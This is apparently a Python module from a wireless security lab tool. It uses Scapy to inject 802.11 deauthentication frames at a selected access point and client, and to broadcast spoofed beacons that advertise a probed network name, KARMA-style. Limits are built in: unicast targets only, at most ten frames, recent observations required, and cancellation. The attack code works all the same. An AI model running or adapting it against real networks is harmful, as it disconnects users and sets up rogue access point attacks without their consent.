"""Short, operator-scoped unicast deauthentication test for an isolated lab."""
from datetime import datetime, timezone
from . import wireless_monitor
from .network_engine import ScanCancelled


def validate_probe(scan, scan_id, interface, source, ssid):
    if not scan or scan.get('id') != scan_id or scan.get('interface') != interface:
        raise ValueError('Refresh the completed wireless observation first')
    if not isinstance(ssid, str) or not 1 <= len(ssid.encode('utf-8')) <= 32 or not wireless_monitor.is_unicast(source):
        raise ValueError('Select a named probe from a unicast lab device')
    if not any(p.get('source', '').lower() == source.lower() and p.get('ssid') == ssid for p in scan.get('probes', [])):
        raise ValueError('Select a probe recorded in the completed observation')
    try:
        age = (datetime.now(timezone.utc) - datetime.fromisoformat(scan['finished_at'])).total_seconds()
    except (KeyError, TypeError, ValueError):
        raise ValueError('Invalid observation timestamp')
    if not 0 <= age <= 300:
        raise ValueError('Observe the lab probes again; the observation is older than five minutes')


def advertise_probe(interface, ssid, frames, channel, cancel):
    """Reference KARMA behavior: advertise one selected probe SSID, not an AP service."""
    if not 1 <= frames <= 10 or not 1 <= len(ssid.encode('utf-8')) <= 32:
        raise ValueError('Invalid beacon test parameters')
    selected = next((r for r in wireless_monitor.interfaces()['interfaces'] if r['name'] == interface), None)
    if not selected or selected['mode'] != 'monitor' or channel is None or selected['channel'] != channel or not 1 <= channel <= 14:
        raise ValueError('A monitor interface on the observed 2.4 GHz channel is required')
    import secrets
    from scapy.all import conf
    from scapy.layers.dot11 import RadioTap, Dot11, Dot11Beacon, Dot11Elt
    bssid = '02:' + ':'.join(f'{byte:02x}' for byte in secrets.token_bytes(5))
    packet = (RadioTap()/Dot11(type=0, subtype=8, addr1='ff:ff:ff:ff:ff:ff', addr2=bssid, addr3=bssid)/
              Dot11Beacon(cap='ESS')/Dot11Elt(ID=0, info=ssid.encode('utf-8'))/
              Dot11Elt(ID=1, info=b'\x82\x84\x8b\x96')/Dot11Elt(ID=3, info=bytes([channel])))
    if cancel.is_set():
        raise ScanCancelled()
    sent = 0
    try:
        with conf.L2socket(iface=interface) as sender:
            for index in range(frames):
                if cancel.is_set():
                    break
                packet.SC = index << 4
                sender.send(packet)
                sent += 1
                if cancel.wait(.25):
                    break
    except OSError as exc:
        raise ValueError('Beacon transmission failed; verify adapter injection support and permissions') from exc
    return {'status': 'CANCELLED' if cancel.is_set() else 'TRANSMISSION_ATTEMPTED',
            'kind': 'SELECTED_PROBE_BEACON', 'interface': interface, 'ssid': ssid, 'test_bssid': bssid,
            'frames_submitted': sent, 'effect': 'UNVERIFIED', 'finished_at': datetime.now(timezone.utc).isoformat(),
            'message': 'Selected-probe beacon test only, matching the reference advertising behavior. No usable AP, association handling, portal or credential collection. Verify reception independently.'}


def validate_target(scan, scan_id, interface, bssid, client):
    if not scan or scan.get('id') != scan_id or scan.get('interface') != interface:
        raise ValueError('Refresh the completed wireless observation before selecting the lab target')
    if not all(wireless_monitor.is_unicast(a) for a in (bssid, client)) or bssid.lower() == client.lower():
        raise ValueError('Select distinct unicast AP and client addresses; broadcast targets are not supported')
    pairs = {(r['bssid'].lower(), r['client'].lower()) for r in scan.get('clients', [])}
    if (bssid.lower(), client.lower()) not in pairs:
        raise ValueError('The AP/client pair must appear in the completed wireless observation')
    try:
        when = datetime.fromisoformat(scan['finished_at'])
        age = (datetime.now(timezone.utc) - when).total_seconds()
    except (KeyError, TypeError, ValueError):
        raise ValueError('Wireless observation timestamp is invalid')
    if not 0 <= age <= 300:
        raise ValueError('Observe the lab devices again; the target observation is older than five minutes')


def deauthenticate(interface, bssid, client, frames, channel, cancel):
    if not 1 <= frames <= 10 or not all(wireless_monitor.is_unicast(a) for a in (bssid, client)) or bssid.lower() == client.lower():
        raise ValueError('Invalid lab target or frame count')
    selected = next((r for r in wireless_monitor.interfaces()['interfaces'] if r['name'] == interface), None)
    if not selected or selected['mode'] != 'monitor' or channel is None or selected['channel'] != channel:
        raise ValueError('The same monitor interface and observed channel are required')
    from scapy.all import conf
    from scapy.layers.dot11 import RadioTap, Dot11, Dot11Deauth
    packet = RadioTap()/Dot11(type=0, subtype=12, addr1=client, addr2=bssid, addr3=bssid)/Dot11Deauth(reason=3)
    sent = 0
    if cancel.is_set():
        raise ScanCancelled()
    try:
        with conf.L2socket(iface=interface) as sender:
            for _ in range(frames):
                if cancel.is_set():
                    break
                sender.send(packet)
                sent += 1
                if cancel.wait(.25):
                    break
    except OSError as exc:
        raise ValueError('Lab transmission failed; adapter injection support and permissions must be verified') from exc
    return {'status': 'CANCELLED' if cancel.is_set() else 'TRANSMISSION_ATTEMPTED',
            'interface': interface, 'bssid': bssid, 'client': client, 'frames_submitted': sent,
            'effect': 'UNVERIFIED', 'finished_at': datetime.now(timezone.utc).isoformat(),
            'message': 'Frames submitted to the driver do not prove over-air transmission or disconnection. Verify the lab client independently; protected management frames may prevent the effect.'}
